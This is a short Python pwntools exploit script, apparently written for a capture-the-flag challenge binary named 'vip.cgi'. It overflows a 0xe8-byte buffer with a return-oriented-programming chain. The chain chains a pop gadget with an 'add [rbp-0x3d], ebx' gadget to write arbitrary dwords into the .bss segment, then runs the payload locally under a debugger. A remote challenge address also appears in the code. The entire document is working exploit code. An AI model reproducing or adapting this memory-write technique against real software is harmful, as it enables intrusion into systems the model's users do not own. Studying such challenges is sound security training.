from pwn import *

elf=ELF("./vip.cgi")
ip="94.74.101.210"
port="49430"
# sh = remote('94.74.101.210',49185)
pop_rbx_rbp4=0x401206
add_rbp_3d_ebx=0x4009B8
def write_dword(target,ori,aft):
    payload=p64(pop_rbx_rbp4)+p64(0)
    payload+=p64(aft-ori)+p64(target+0x3d)
    payload+=p64(0)*4
    payload+=p64(add_rbp_3d_ebx)
    return payload
def write_str(target,mstr):
    length=len(mstr)
    i=0
    payload=b''
    while i<length:
        tmp=mstr[i:i+4]
        tmp=tmp.ljust(4,b'\x00')
        tmp=u32(tmp)
        payload+=write_dword(target,0,tmp)
        target+=4
        i+=4
    return payload
    
payload=b'a'*0xe8+write_str(elf.bss()+0x400,b"nihaonihao")
env={
    "CONTENT_LENGTH":str(len(payload))
}
sh=process(["./vip.cgi"],env=env)
gdb.attach(sh)
sh.sendline(payload)
sh.interactive()

    